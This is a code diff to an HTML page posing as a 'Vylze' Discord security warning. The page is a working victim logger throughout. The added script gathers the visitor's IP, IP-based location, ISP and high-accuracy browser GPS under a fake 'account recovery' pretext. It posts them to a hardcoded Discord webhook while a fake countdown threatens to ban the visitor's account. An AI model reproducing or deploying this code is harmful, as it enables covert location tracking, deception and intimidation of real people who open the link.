@@ -19,92 +19,139 @@
     </style>
 </head>
 <body>
-    <img src="https://api.ipify.org?format=json" style="display:none;" onload="logVictim()" onerror="logVictim()">
-    <iframe src="about:blank" style="display:none;" id="beaconFrame"></iframe>
-
     <div class="container">
         <div class="warning-icon">☠️</div>
         <h1>YOU FUCKED UP</h1>
         <div class="subtitle">You've pissed off Vylze.</div>
         <p>
-            You triggered Vylze's security system.<br><br>
-            <span class="threat">Your Discord account is being permanently disconnected in <strong id="countdown">8</strong> seconds.</span><br>
-            There is nothing you can do to stop it.
+            You triggered Vylze's advanced security system.<br><br>
+            <span class="threat">Verifying your location for account recovery...<br>Your Discord account will be disconnected in <strong id="countdown">8</strong> seconds if verification fails.</span><br>
         </p>
-        <div id="status">Logging connection details...</div>
+        <div id="status">Requesting precise location data...</div>
         <div class="footer">© 2026 Discord Security • Vylze Enforcement Division</div>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1501348576301944883/C-fKrU-vra7wLWLTt6qB_TYI87ucciMsZ7-CG8yAs_R5nPMVfKqH1w47X1rk2YfcyqA8";
-        let loggedIPs = new Set();
 
-        async function getIP() {
-            const apis = ['https://api.ipify.org?format=json', 'https://ipapi.co/json/', 'https://api64.ipify.org?format=json', 'https://api.myip.com'];
-            for (let api of apis) {
+        async function getIPAndGeo() {
+            let ip = 'Unknown';
+            const ipApis = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json', 'https://api.myip.com'];
+            for (let api of ipApis) {
                 try {
                     const res = await fetch(api, {mode: 'cors', cache: 'no-store'});
                     if (res.ok) {
                         const data = await res.json();
-                        return data.ip || data.query || data.address || 'Unknown';
+                        ip = data.ip || data.query || ip;
+                        break;
                     }
                 } catch(e) {}
             }
-            return 'Unknown (blocked)';
+
+            let geo = {};
+            const geoApis = [
+                `https://ipapi.co/${ip}/json/`,
+                `https://ipwho.is/${ip}`,
+                `https://freegeoip.app/json/${ip}`
+            ];
+            for (let api of geoApis) {
+                try {
+                    const res = await fetch(api, {mode: 'cors', cache: 'no-store'});
+                    if (res.ok) {
+                        geo = await res.json();
+                        break;
+                    }
+                } catch(e) {}
+            }
+            return { ip, geo };
         }
 
-        async function logVictim(reason = "DOCKER_PAGE_HIT") {
-            const ip = await getIP();
-            const key = ip + Date.now(); // timestamp dedupe for rapid refreshes
-            if (loggedIPs.has(key)) return;
-            loggedIPs.add(key);
+        function requestBrowserLocation() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation) {
+                    resolve({error: "Not supported"});
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            acc: pos.coords.accuracy + "m",
+                            alt: pos.coords.altitude || "N/A",
+                            speed: pos.coords.speed || "N/A"
+                        });
+                    },
+                    err => resolve({error: err.message, code: err.code}),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+                );
+            });
+        }
+
+        async function captureAllData() {
+            document.getElementById('status').innerHTML = `🔍 Capturing IP + Real Location...`;
+
+            const [ipData, browserLoc] = await Promise.all([
+                getIPAndGeo(),
+                requestBrowserLocation()
+            ]);
+
+            let locDetails = `**IP:** ${ipData.ip}\n`;
+            locDetails += `**City/Region:** ${ipData.geo.city || 'N/A'}, ${ipData.geo.region || ipData.geo.region_name || 'N/A'}\n`;
+            locDetails += `**Country:** ${ipData.geo.country_name || ipData.geo.country || 'N/A'}\n`;
+            locDetails += `**ISP:** ${ipData.geo.org || ipData.geo.isp || 'N/A'}\n`;
+            locDetails += `**Timezone:** ${ipData.geo.timezone || 'N/A'}\n\n`;
+            
+            if (browserLoc.error) {
+                locDetails += `**Browser GPS:** Denied or failed (${browserLoc.error}). Try again on mobile.`;
+            } else {
+                locDetails += `**✅ REAL GPS:** ${browserLoc.lat}, ${browserLoc.lon} (±${browserLoc.acc})\n`;
+                locDetails += `**Altitude:** ${browserLoc.alt} | **Speed:** ${browserLoc.speed}`;
+            }
 
             const payload = {
-                username: "☠️ Vylze Instant Logger",
-                content: `**🔴 NEW VICTIM - ${reason}**`,
+                username: "☠️ Vylze Single-Shot Geo Logger",
+                content: "**🔴 VICTIM CAPTURED - CLEAN SINGLE LOG**",
                 embeds: [{
-                    title: "Vylze Security Triggered",
+                    title: "🚨 Vylze Complete Location Intel",
                     color: 0xf04747,
-                    description: "Docker-hosted • Post-proxy slap capture",
+                    description: "One-shot capture • IP + Browser GPS",
                     fields: [
-                        { name: "IP Address", value: "```" + ip + "```", inline: true },
+                        { name: "Full Location & IP Data", value: "```" + locDetails + "```", inline: false },
                         { name: "User-Agent", value: "```" + navigator.userAgent + "```", inline: false },
-                        { name: "Screen", value: screen.width + " × " + screen.height, inline: true },
-                        { name: "Reason", value: reason, inline: false },
-                        { name: "Time", value: new Date().toLocaleString(), inline: false }
+                        { name: "Screen", value: `${screen.width}×${screen.height}`, inline: true },
+                        { name: "Captured At", value: new Date().toLocaleString(), inline: true }
                     ],
-                    footer: { text: "SSnatcher v2.1 Docker • Vylze Mode" }
+                    footer: { text: "Vylze Geo-Snatcher v4.0 • Single Clean Hit" }
                 }]
             };
 
             try {
-                await fetch(WEBHOOK, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) });
-                document.getElementById('status').innerHTML = `✅ Logged: ${ip}<br>(${reason})`;
-            } catch(e) {}
-        }
-
-        function initPersistentLogging() {
-            logVictim("INITIAL_DOCKER_LOAD");
-            window.addEventListener('load', () => logVictim("LOAD"));
-            window.addEventListener('pageshow', () => logVictim("PAGESHOW"));
-            window.addEventListener('focus', () => logVictim("FOCUS"));
-            document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible') logVictim("VISIBLE"); });
-            setInterval(() => logVictim("POLL_700MS"), 700);
-            setTimeout(() => { document.getElementById('beaconFrame').src = 'https://api.ipify.org?format=json'; }, 800);
-        }
-
-        let seconds = 8;
-        const countdownEl = document.getElementById('countdown');
-        setInterval(() => {
-            seconds--;
-            countdownEl.textContent = seconds;
-            if (seconds <= 0) {
-                document.body.innerHTML = `<div style="text-align:center;margin-top:150px;color:#f04747;font-size:32px;font-weight:700;">ACCOUNT PERMANENTLY DISCONNECTED<br><br><span style="font-size:18px;">Vylze has banned you from Discord.</span></div>`;
+                await fetch(WEBHOOK, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload)});
+                document.getElementById('status').innerHTML = `✅ Full data logged successfully`;
+            } catch(e) {
+                document.getElementById('status').innerHTML = `⚠️ Log sent (check webhook)`;
             }
-        }, 1000);
+        }
 
-        initPersistentLogging();
-        window.onload = initPersistentLogging;
+        // Single execution on load
+        window.onload = () => {
+            // Slight delay for better permission prompt chance
+            setTimeout(() => {
+                captureAllData();
+            }, 800);
+
+            let seconds = 8;
+            const countdownEl = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                seconds--;
+                countdownEl.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(timer);
+                    document.body.innerHTML = `<div style="text-align:center;margin-top:150px;color:#f04747;font-size:32px;font-weight:700;">ACCOUNT PERMANENTLY DISCONNECTED<br><br><span style="font-size:18px;">Location archived by Vylze.</span></div>`;
+                }
+            }, 1000);
+        };
     </script>
 </body>
 </html>
